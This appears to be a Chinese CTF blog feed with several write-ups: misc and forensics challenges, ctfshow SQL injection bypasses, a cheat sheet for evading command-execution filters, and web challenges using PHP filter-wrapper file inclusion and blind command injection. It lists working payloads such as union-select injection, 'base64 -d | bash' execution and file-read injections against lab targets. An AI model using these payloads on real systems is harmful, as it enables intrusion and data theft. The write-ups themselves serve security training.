excl 表格，得到 flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117171347734.png" alt="image-20250117171347734"></p><blockquote><p>flag{E7A10C15E26AA5750070EF756AAA1F7C}</p></blockquote><h4 id="压力大，写个脚本吧"><a href="#压力大，写个脚本吧" class="headerlink" title="压力大，写个脚本吧"></a>压力大，写个脚本吧</h4><blockquote><p>考点：脚本编写能力</p></blockquote><p><img src="E:/%E5%B7%A5%E7%A8%8B%E5%AE%9E%E8%B7%B5/%E5%B7%A5%E5%85%B7/typora/Typora/upload/image-20250117171504745.png" alt="image-20250117171504745"></p><p>很明显是有密码的套娃压缩包，直接编写脚本解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import base64</span><br><span class="line">for i in range(99,0,-1):</span><br><span class="line">    i=str(i)</span><br><span class="line">    zipname = &quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\压力大，写个脚本吧\\zip_&quot;+i+&quot;.zip&quot;</span><br><span class="line">    passwd_path = &quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\压力大，写个脚本吧\\password_&quot;+i+&quot;.txt&quot;</span><br><span class="line">    passwd = open(passwd_path, &quot;r&quot;).read()</span><br><span class="line">    passwd = base64.b64decode(passwd)</span><br><span class="line">    print(passwd)</span><br><span class="line">    ts1 = zipfile.ZipFile(zipname,&#x27;r&#x27;)</span><br><span class="line">    ts1.extractall(r&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\压力大，写个脚本吧&quot;,pwd=passwd)</span><br><span class="line">    ts1.close()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117171704899.png" alt="image-20250117171704899"></p><p>提示是 png，然后我们将 password_0.txt 的密码进行 base64 解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">89504E470D0A1A0A0000000D494844520000019000000190</span><br></pre></td></tr></table></figure><p>发现是个 png 文件头，所以这些密码应该组合在一起就是一张 png 图片。脚本直接放</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">stringall = &quot;&quot;</span><br><span class="line">for i in range(0, 100):</span><br><span class="line">    i = str(i)</span><br><span class="line">    passwd_path = &quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\压力大，写个脚本吧\\password_&quot;+i+&quot;.txt&quot;</span><br><span class="line">    string = open(passwd_path, &quot;r&quot;).read()</span><br><span class="line">    stringall += string</span><br><span class="line">print(base64.b64decode(stringall))</span><br></pre></td></tr></table></figure><p>得到一张二维码，直接扫，就得到了 flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117172005199.png" alt="image-20250117172005199"></p><blockquote><p>flag{<em>PASSWORDs_is_fl@g!</em>}</p></blockquote><h4 id="ez-forensics"><a href="#ez-forensics" class="headerlink" title="ez_forensics"></a>ez_forensics</h4><blockquote><p>考点：镜像取证</p></blockquote><p>下载附件解压，先文件扫描一下看看，查找一下关键词</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121134845419.png" alt="image-20250121134845419"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121134909012.png" alt="image-20250121134909012"></p><p>将这两个文件（压缩包和txt）提取出来，发现压缩包解压需要密码。查看hint.txt</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121135038002.png" alt="image-20250121135038002"></p><p>60 = 13 +47，想到用rot13和rot47解密，得到</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121135247193.png" alt="image-20250121135247193"></p><p>可以知道，压缩包的解压密码需要进行hashdump。</p><p>然后找到用户密码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121135742846.png" alt="image-20250121135742846"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121135722955.png" alt="image-20250121135722955"></p><p>解压后得到文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121135900120.png" alt="image-20250121135900120"></p><p>结合提示搜索，发现了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121140041681.png" alt="image-20250121140041681"></p><p>结合用户名，可以知道使用的试MobaXterm，所以ini文件是其配置文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121140134279.png" alt="image-20250121140134279"></p><p>网上搜索其密码解密，找到一篇博客，知道可以使用脚本解密</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121140432635.png" alt="image-20250121140432635"></p><p>master password就使用文件名 flag_is_here</p><p>最后解密得到</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121140457763.png" alt="image-20250121140457763"></p><p>将flag内的内容进行base64解密得到flag。</p><blockquote><p>flag{you_are_a_g00d_guy}</p></blockquote><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h4 id="通往哈希的旅程"><a href="#通往哈希的旅程" class="headerlink" title="通往哈希的旅程"></a>通往哈希的旅程</h4><blockquote><p>考点：哈希</p></blockquote><p>根据提示得到一个哈希密文</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117172603778.png" alt="image-20250117172603778"></p><p>直接哈希爆破或者在线解密得到</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117172632734.png" alt="image-20250117172632734"></p><blockquote><p>flag{18876011645}</p></blockquote>]]></content>
    
    
    <summary type="html">🥧2024年春秋杯网络安全联赛冬季赛wp-1.17</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="比赛wp" scheme="https://m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow萌新web</title>
    <link href="https://m3x1.cn/posts/72ad6da1.html"/>
    <id>https://m3x1.cn/posts/72ad6da1.html</id>
    <published>2024-11-30T16:00:00.000Z</published>
    <updated>2025-02-01T16:17:29.916Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>来源：ctfshow</p></blockquote><p>[TOC]</p><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><blockquote><p>考点：inval()函数漏洞，sql注入</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"># 包含数据库连接文件</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line"># 判断get提交的参数id是否存在</span><br><span class="line">if(isset($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">    $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    # 判断id的值是否大于999</span><br><span class="line">    if(intval($id) &gt; 999)&#123;</span><br><span class="line">        # id 大于 999 直接退出并返回错误</span><br><span class="line">        die(&quot;id error&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        # id 小于 999 拼接sql语句</span><br><span class="line">        $sql = &quot;select * from article where id = $id order by id limit 1 &quot;;</span><br><span class="line">        echo &quot;执行的sql为：$sql&lt;br&gt;&quot;;</span><br><span class="line">        # 执行sql 语句</span><br><span class="line">        $result = $conn-&gt;query($sql);</span><br><span class="line">        # 判断有没有查询结果</span><br><span class="line">        if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">            # 如果有结果，获取结果对象的值$row</span><br><span class="line">            while($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">                echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        # 关闭数据库连接</span><br><span class="line">        $conn-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- flag in id = 1000 --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><blockquote><p>由于没有限制输入，所以只需要利用inval()的漏洞和sql注入漏洞拿到flag。</p><ol><li><p>?id=’1000‘       #字符串绕过 </p></li><li><p>?id=0x3e8      #转换成16进制绕过</p></li><li>?id=-1 or id=1000    </li><li>?id=100*10</li><li>?id=~~1000   #两次取反</li><li>?id=900%2B100      #%2B是+的url编码</li><li>?id=round(999.9) </li><li>?id=999 or 1=1 —+</li><li>?id=0b1111101000     #二进制</li><li>?id=125&lt;&lt;3</li><li>?id=1 union select * from article; —+</li><li>?id=/<em>!1000</em>/ 内联注释</li></ol><p>ctfshow{5853bd20-b1d4-420d-aa13-0c343c7e9461}</p></blockquote><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"># 包含数据库连接文件</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line"># 判断get提交的参数id是否存在</span><br><span class="line">if(isset($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">        $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    if(preg_match(&quot;/or|\+/i&quot;,$id))&#123;</span><br><span class="line">            die(&quot;id error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    # 判断id的值是否大于999</span><br><span class="line">    if(intval($id) &gt; 999)&#123;</span><br><span class="line">        # id 大于 999 直接退出并返回错误</span><br><span class="line">        die(&quot;id error&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        # id 小于 999 拼接sql语句</span><br><span class="line">        $sql = &quot;select * from article where id = $id order by id limit 1 &quot;;</span><br><span class="line">        echo &quot;执行的sql为：$sql&lt;br&gt;&quot;;</span><br><span class="line">        # 执行sql 语句</span><br><span class="line">        $result = $conn-&gt;query($sql);</span><br><span class="line">        # 判断有没有查询结果</span><br><span class="line">        if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">            # 如果有结果，获取结果对象的值$row</span><br><span class="line">            while($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">                echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        # 关闭数据库连接</span><br><span class="line">        $conn-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- flag in id = 1000 --&gt;</span><br><span class="line">&lt;/html&gt; </span><br></pre></td></tr></table></figure><blockquote><p>多了一个过滤，不能用or, +号，上面筛选一下就行</p><p>?id=’1000’</p><p>ctfshow{622abd97-affc-4f13-9cb8-7181b9cc0ffa}</p></blockquote><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">        $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    if(preg_match(&quot;/or|\-|\\|\*|\&lt;|\&gt;|\!|x|hex|\+/i&quot;,$id))&#123;</span><br><span class="line">            die(&quot;id error&quot;);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><blockquote><p>依然是多了个过滤。?id=’1000’</p><p>ctfshow{560b6c4f-7a73-4d0d-96ae-cb941878bdc9}</p></blockquote><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">        $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    if(preg_match(&quot;/or|\-|\\\|\/|\\*|\&lt;|\&gt;|\!|x|hex|\(|\)|\+|select/i&quot;,$id))&#123;</span><br><span class="line">            die(&quot;id error&quot;);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><blockquote><p>?id=’1000’</p><p>ctfshow{3390706c-7566-466c-a86e-37a6d19f95cc}</p></blockquote><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2>]]></content>
    
    
    <summary type="html">ctfshow萌新web-wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="web-wp" scheme="https://m3x1.cn/tags/web-wp/"/>
    
  </entry>
  
  <entry>
    <title>命令执行过滤关键字</title>
    <link href="https://m3x1.cn/posts/d36c6b6d.html"/>
    <id>https://m3x1.cn/posts/d36c6b6d.html</id>
    <published>2024-11-29T16:00:00.000Z</published>
    <updated>2024-12-02T08:48:57.118Z</updated>
    
    <content type="html"><![CDATA[<h2 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5415034b6a6c6d525395ede652e55b0f.png" alt=""></p><p>反斜杠绕过  <code>ca\t y1n\g.php</code><br>两个单引号绕过  <code>cat y1&#39;&#39;ng.php</code><br>base64编码绕过 <code>echo “base64编码” | base64 -d | bash</code><br>hex编码绕过 <code>echo &quot;hex编码&quot; | xxd -r -p | bash</code><br>用[ ]进行匹配  <code>cat y1[n]g.php</code><br>用<em> 匹配任意 `cat y1n</em><code>用?匹配任意</code>cat y1n?<code>用&#123; &#125;匹配范围</code>cat y1{a..z}g.php<code>变量</code>$a=fl;$b=ag;cat $a$b.php<code>拼接绕过</code>‘fl’.’ag’`</p><p>括号绕过 (sy.(st).em)(ls);</p><p>除了上述方式，还可以用字符串拼接的方式绕过。</p><p>python字符串拼接:<br>1.+       eg: ‘a’+’b’     输出:’ab’<br>2.贴贴    eg: ‘a’’b’       输出:’ab’</p><p>PHP拼接:<br>.    eg: ‘a’.’b’      输出:’ab’</p><p>解释内联执行：将前一个执行结果作为后一个执行的参数。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ede76d59480f5f8a630234a9b9262bfd.jpg" alt=""></p><h2 id="过滤所有字母和数字"><a href="#过滤所有字母和数字" class="headerlink" title="过滤所有字母和数字:"></a>过滤所有字母和数字:</h2><p>1.位运算-异或（见脚本）<br>2.取反（见脚本）</p><p>3.短标签</p><p>一个字符串，将它用括号括起来，后面再跟一个括号，就会调用同名的函数。</p><p>eg:(“system”)();  其实就等于执行  system();</p><p>eg:(“system”)(“ls”);  其实就等于执行  system(“ls”);</p><p>将 system 等字符串用位运算进行编码，可以绕过许多过滤。<br>注意: 编码后不用””，样式是 (编码)();</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/QQ%E5%9B%BE%E7%89%8720240807145304.png" alt=""></p><h2 id="使用include函数包含绕过："><a href="#使用include函数包含绕过：" class="headerlink" title="使用include函数包含绕过："></a>使用include函数包含绕过：</h2><p>?c=include%0a$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</p><h2 id="嵌套绕过："><a href="#嵌套绕过：" class="headerlink" title="嵌套绕过："></a>嵌套绕过：</h2><p>?c=eval($_GET[1]);$1=phpinfo();</p><p>若能执行，变量$1就不再受过滤限制</p><h2 id="积累："><a href="#积累：" class="headerlink" title="积累："></a>积累：</h2><ol><li><p>过滤/，如 ls /用不了，可以使用ls -al，然后命令联合执行</p></li><li><p>%0a是回车符的url编码，有时候过滤了;&amp;|可以使用，但是注意，最好在浏览器url栏直接使用，或者使用hackbar，在题目的输入框使用可能没有效果。</p></li></ol>]]></content>
    
    
    <summary type="html">🥧命令执行过滤关键字</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://m3x1.cn/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>HUBU新星杯wp</title>
    <link href="https://m3x1.cn/posts/3c1876bb.html"/>
    <id>https://m3x1.cn/posts/3c1876bb.html</id>
    <published>2024-11-29T16:00:00.000Z</published>
    <updated>2025-02-01T16:20:58.308Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="HUBU新星杯wp"><a href="#HUBU新星杯wp" class="headerlink" title="HUBU新星杯wp"></a>HUBU新星杯wp</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="Robots-Leak"><a href="#Robots-Leak" class="headerlink" title="Robots Leak"></a>Robots Leak</h4><blockquote><p>考点：git泄露</p><p>开启题目</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130175850152.png" alt="image-20241130175850152"></p><blockquote><p>先扫目录</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180035365.png" alt="image-20241130180035365"></p><blockquote><p>git泄露，直接拉取git到本地，然后有个.git文件</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180200728.png" alt="image-20241130180200728"></p><blockquote><p>进入到文件里，查看日志</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180256138.png" alt="image-20241130180256138"></p><blockquote><p>找到关键词flag，查看一下内容</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180337316.png" alt="image-20241130180337316"></p><blockquote><p>拿到一半flag。</p><p>查看一下其他日志内容，都没什么营养，然后看看有没有文件，用git stash pop</p><p>发现拉取了一个.flag.exe，查看得到下一半</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180607763.png" alt="image-20241130180607763"></p><blockquote><p>合起来就是全部flag</p><p>HUBUCTF{431332b1-e91f-4437-9036-b9059539886f}</p></blockquote><h4 id="ez-http"><a href="#ez-http" class="headerlink" title="ez-http"></a>ez-http</h4><blockquote><p>考点：http基础</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180913089.png" alt="image-20241130180913089"></p><blockquote><p>http基础，按要求一步一步来，建议抓包放进重放器里面，方便</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130181057278.png" alt="image-20241130181057278"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130181134970.png" alt="image-20241130181134970"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130181201614.png" alt="image-20241130181201614"></p><blockquote><p>剩下的就是改referrer，添加一个ip(网上搜一下，多试)，然后改cookie等等。（不截图了）</p></blockquote><h4 id="Random-Door"><a href="#Random-Door" class="headerlink" title="Random_Door"></a>Random_Door</h4><blockquote><p> 考点：python脚本，php伪协议</p><p>打开网站</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130215117246.png" alt="image-20241130215117246"></p><blockquote><p>嗯，好，满天星，写个脚本挨着读</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">base_url = &quot;http://challenge.hubuctf.cn:30423/flag&quot;</span><br><span class="line">delay = 1  # 延迟1秒</span><br><span class="line"></span><br><span class="line">for i in range(1, 101):</span><br><span class="line">    url = f&quot;&#123;base_url&#125;&#123;i&#125;.php&quot;</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        </span><br><span class="line">        if response.status_code == 200:</span><br><span class="line">            print(f&quot;Success: &#123;url&#125;&quot;)</span><br><span class="line">            print(response.text)</span><br><span class="line">            print(&quot;-&quot; * 40)</span><br><span class="line">    except requests.RequestException as e:</span><br><span class="line">        print(f&quot;Failed to access &#123;url&#125;: &#123;e&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">    # 延迟1秒</span><br><span class="line">    time.sleep(delay)</span><br><span class="line"></span><br><span class="line">print(&quot;All requests completed.&quot;)</span><br></pre></td></tr></table></figure><blockquote><p>最后发现只有两个能打开。</p><p>先看第一个，在flag42.php</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130215346661.png" alt="image-20241130215346661"></p><blockquote><p>这是个提示信息，提示可能要传参file</p><p>再看第二个flag79.php</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130215427479.png" alt="image-20241130215427479"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (preg_match(&#x27;/base64|http/&#x27;, $_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    die(&#x27;base64 | http is not allowed&#x27;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;flag in flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">include $_GET[&#x27;file&#x27;];</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><blockquote><p>传file，直接filter伪协议读取，然后你就会发现。。。。</p><p>flag.php是空哒！哈哈哈哈哈！！！！！！</p><p>我只能说真会玩，第一个网页才是真的后门入口，在第一个网页进行filter读取拿到flag。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgJGZsYWc9ICJIVUJVQ1RGezUwMGE0MzEyLTM2ZTItNDlkZi05MjRlLTkyY2EzYWM0MDMwN30iIDs/Pgo=</span><br></pre></td></tr></table></figure><blockquote><p>解码得到flag</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HUBUCTF&#123;500a4312-36e2-49df-924e-92ca3ac40307&#125;</span><br></pre></td></tr></table></figure><h4 id="RCE-Level-2"><a href="#RCE-Level-2" class="headerlink" title="RCE - Level 2"></a>RCE - Level 2</h4><blockquote><p>考点：无回显rce</p><p>根据提示知道是没有回显的。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207181550210.png" alt="image-20241207181550210"></p><blockquote><p>打开界面，发现是个登录框，先用御剑扫一下目录</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207181645879.png" alt="image-20241207181645879"></p><blockquote><p>发现cmd.php，打开发现就是命令执行框</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207181722098.png" alt="image-20241207181722098"></p><blockquote><p>先随便ping一个</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207181915228.png" alt="image-20241207181915228"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207181942232.png" alt="image-20241207181942232"></p><blockquote><p>发现几乎没啥过滤，但是就是无回显</p><p>无回显做法：</p><p>\1. 将运行结果写入到网站的文件里。</p><p>\2. 写马</p><p>\3. 进行数据外带，如dnslog，curl等都可以</p><p>经过测试，发现static/script.js是可以写入的（虽然我也不知道怎么测试的，是看的别人的wp）</p><p>在输入框中输入 127.0.0.1;ls &gt; static/script.js ,页面显示<strong>执行成功</strong></p><p>后查看js文件，可以看到执行的结果</p><p>在根目录下找到flag文件 f1ag_1s_h3r3 （ 127.0.0.1;ls / &gt; static/script.js )</p><p>继续读取flag ，执行 127.0.0.1;cat /f1ag_1s_h3r3 &gt; static/script.js</p></blockquote><h4 id="Web-Pentest"><a href="#Web-Pentest" class="headerlink" title="Web Pentest *"></a>Web Pentest *</h4><blockquote><p>考点：APK分析，反序列化</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207183244358.png" alt="image-20241207183244358"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207183301370.png" alt="image-20241207183301370"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207183315132.png" alt="image-20241207183315132"></p><blockquote><p>根据对话信息可以推测，可能在协会官网的源代码里</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207183504391.png" alt="image-20241207183504391"></p><blockquote><p><strong>方式一</strong></p><p>逆向手应该都有安卓模拟器，直接apk安装到模拟器上。或者直接安装到手机上。</p><p>启动app就直接有了web后台地址。</p><p><strong>方式二</strong></p><p>misc 手应该需要会，apk本质也是个压缩包。把apk后缀改成zip然后解压。直接搜flag 但是有一点要注意，app打包之后xml文件是二进制。因此也考察了选手对于grep的使用情况</p><p>/flag1-21daSD21agfgDDDZVFGSVsasd32Ws2asCZCDw.php</p><p>admin:admin</p><p>grep -a -r “flag” .  # 搜索二进制 递归搜索</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207183733181.png" alt="image-20241207183733181"></p><blockquote><p>然后里面就是个简单的反序列化考点</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 